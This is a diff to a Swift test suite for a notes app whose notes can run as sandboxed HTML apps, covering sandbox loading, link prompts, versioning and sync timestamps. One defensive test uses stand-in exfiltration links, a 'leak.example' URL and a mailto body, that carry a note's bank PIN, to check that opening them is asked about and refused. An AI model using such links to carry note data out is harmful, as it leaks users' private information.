@@ -280,6 +280,23 @@ import AppKit
         return try #require(result)
     }
 
+    /// A sandbox is made ahead of time with a blank document loading in it. Taken the moment it
+    /// was made (a new version arriving while the app is still opening its note at launch), it
+    /// must still load the app: the note stayed blank.
+    @Test func anAppOpensInASandboxTakenWhileItsBlankDocumentIsStillLoading() async throws {
+        for round in 0..<4 {
+            _ = try await NotePageSandbox.make() // a spare starts behind this one
+            for _ in 0..<(round * 3) { await Task.yield() }
+            let sandbox = try await NotePageSandbox.make()
+            var result: Bool?
+            sandbox.onReady = { result = true }
+            sandbox.onFailure = { _ in result = false }
+            sandbox.load(html: "<main id=m></main><script>amber.onChange((n) => { m.textContent = n.title })</script>", body: Self.habits)
+            for _ in 0..<100 where result == nil { try await Task.sleep(for: .milliseconds(50)) }
+            #expect(result == true, "round \(round): the app should draw, not be refused as a navigation (\(sandbox.blocked))")
+        }
+    }
+
     @Test func aPageThatThrowsOrDrawsNothingIsReportedAsFailed() async throws {
         let good = try await outcome("<main id=m></main><script>amber.onChange((n) => { m.textContent = n.title })</script>")
         #expect(good.ready)
@@ -576,6 +593,45 @@ import AppKit
         #expect(store.unpushed[id] != nil && store.previous(id)?.html == "<p>c</p>")
     }
 
+    /// An app has no network, but a link it opens leaves the app with whatever its address
+    /// carries. So a link is asked about first, like a request: refused, nothing opens.
+    @Test func anAppAsksBeforeItOpensALink() async throws {
+        #expect(NotePageActions.linkAsk("https://example.org/?q=my+note")?.what == "example.org")
+        #expect(NotePageActions.linkAsk("https://example.org/x")?.remember == true)
+        #expect(NotePageActions.linkAsk("mailto:someone@example.org?body=my%20note")?.what == "Mail, to write to someone@example.org")
+        #expect(NotePageActions.linkAsk("mailto:someone@example.org")?.remember == false)
+        #expect(NotePageActions.linkAsk("tel:+4612345")?.what == "Phone, to call +4612345")
+        #expect(NotePageActions.linkAsk("maps://?q=Lisbon") == nil)
+        let container = try ModelContainer(for: Note.self, Folder.self, Attachment.self, configurations: .init(isStoredInMemoryOnly: true))
+        let note = Note(body: "Secret\n\nmy bank PIN")
+        container.mainContext.insert(note)
+        var asked: [String] = []
+        for link in ["https://leak.example/?d=my+bank+PIN", "mailto:someone@example.org?body=my%20bank%20PIN", "tel:+4612345"] {
+            await #expect(throws: NotePage.OpError.self) {
+                _ = try await NotePageActions.data(["op": "device.openURL", "url": link], note: note, context: container.mainContext, sync: nil,
+                                                   ask: { what in asked.append(what); return false })
+            }
+        }
+        #expect(asked == ["leak.example", "Mail, to write to someone@example.org", "Phone, to call +4612345"])
+    }
+
+    /// Saving an app's data writes its row again, stamped with the device that saved. That is not
+    /// a new version of the app: no receipt, nothing added to its versions, and the AI that made it
+    /// is still who made it.
+    @Test func aRowWrittenAgainForItsDataIsTheSameApp() {
+        let store = NotePageStore(file: nil)
+        let id = UUID(), made = Date(timeIntervalSince1970: 1_760_000_000)
+        store.arrived(id, html: "<p>a</p>", by: "Claude", at: made)
+        let first = NotePageStore.Page(html: "<p>a</p>", by: "Claude", at: made)
+        store.arrived(id, html: "<p>a</p>", by: "iPhone", at: made.addingTimeInterval(60))
+        #expect(store[id] == first && store.history[id] == nil)
+        #expect(!first.isNewVersion(after: store[id]))
+        // A change to its code is one, whoever wrote it.
+        store.arrived(id, html: "<p>b</p>", by: "ChatGPT", at: made.addingTimeInterval(120))
+        #expect(store[id]?.by == "ChatGPT" && store.history[id] == [first])
+        #expect(store[id]?.isNewVersion(after: first) == true)
+    }
+
     // MARK: A new version while you use it
 
     @Test func whatYouTypedComesAlongToTheNewVersion() async throws {
@@ -634,19 +690,31 @@ import AppKit
         #expect(MakeAnApp.prompt(title: "Packing", body: "Packing\n- [ ] a\n- [ ] b\n- [ ] c").contains("make my note \u{201C}Packing\u{201D} an app: a checklist app"))
     }
 
-    // MARK: Not released (NoteApps)
+    // MARK: Pushing an app's data
 
-    @Test func noteAppsAreOffInTheReleasedApp() {
-        // Release with Pinto Notes' own bundle id: off, whatever a launch argument or default says.
-        #expect(!NoteApps.isEnabled(development: false, beta: false, setting: nil))
-        #expect(!NoteApps.isEnabled(development: false, beta: false, setting: true))
-        #expect(!NoteApps.isEnabled(development: false, beta: false, setting: false))
-        // Pinto Notes Beta, and Debug and QA builds: on; `-noteApps NO` shows them as released.
-        for (development, beta) in [(false, true), (true, false), (true, true)] {
-            #expect(NoteApps.isEnabled(development: development, beta: beta, setting: nil))
-            #expect(NoteApps.isEnabled(development: development, beta: beta, setting: true))
-            #expect(!NoteApps.isEnabled(development: development, beta: beta, setting: false))
+    /// The server stamps a row to the microsecond. The push writes only if the row is still the one
+    /// it read, and has to find it by a stamp it can only send in milliseconds.
+    @Test func theDataPushFindsARowStampedToTheMicrosecond() throws {
+        let style = Date.ISO8601FormatStyle(includingFractionalSeconds: true)
+        for micros in [259_987, 0, 999_999, 500, 123_000] {
+            let stamp = Date(timeIntervalSince1970: 1_791_708_890 + Double(micros) / 1_000_000)
+            let w = SyncEngine.stampWindow(stamp)
+            let after = try Date(w.after, strategy: style), before = try Date(w.before, strategy: style)
+            #expect(after < stamp && stamp < before, "the row's own stamp is inside (\(micros) µs)")
+            // Narrow: a write a few milliseconds later is another row state, and is not matched.
+            #expect(before.timeIntervalSince(after) < 0.0035)
+            #expect(!(after < stamp.addingTimeInterval(0.004) && stamp.addingTimeInterval(0.004) < before))
         }
+    }
+
+    // MARK: The switch (NoteApps)
+
+    @Test func noteAppsAreOnInEveryBuildUnlessTheSettingSaysNo() {
+        // The released app too: on with no setting, and with it set to yes.
+        #expect(NoteApps.isEnabled(setting: nil))
+        #expect(NoteApps.isEnabled(setting: true))
+        // `-noteApps NO` (or the default written by hand) still turns them off.
+        #expect(!NoteApps.isEnabled(setting: false))
     }
 
     @Test func withNoteAppsOffANoteWithAnAppIsJustANoteAndKeepsItsApp() {
